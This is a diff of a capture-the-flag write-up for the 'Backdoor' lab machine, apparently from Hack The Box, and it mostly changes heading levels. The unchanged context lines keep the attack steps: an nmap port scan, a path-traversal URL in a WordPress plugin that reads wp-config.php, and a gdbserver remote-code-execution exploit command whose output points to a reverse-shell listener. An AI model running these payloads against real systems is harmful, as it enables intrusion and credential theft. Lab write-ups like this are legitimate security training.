@@ -1,13 +1,13 @@
 # Backdoor
 
-# Content
+### Content
 
 -   WordPress Local File Inclusion Vulnerability (LFI)
 -   LFI to RCE (Abusing /proc/PID/cmdline)
 -   Gdbserver RCE Vulnerability
 -   Abusing Screen (Privilege Escalation) [Session synchronization]
 
-# Reconnaissance
+### Reconnaissance
 
 ```bash
 nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.11.125 -vvv -oN allPorts
@@ -99,7 +99,7 @@ Request:
 <http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php>
 ```
 
-# Exploitation
+### Exploitation
 
 Within the file we found a DB username and password:
 
@@ -277,7 +277,7 @@ sudo python3 gdbserver_rce.py 10.10.11.125:1337 rev.bin
 [*] Pwned!! Check your listener
 ```
 
-## Root privesc
+#### Privilege Escalation
 
 Get SUID by running following command: ^378c24
 
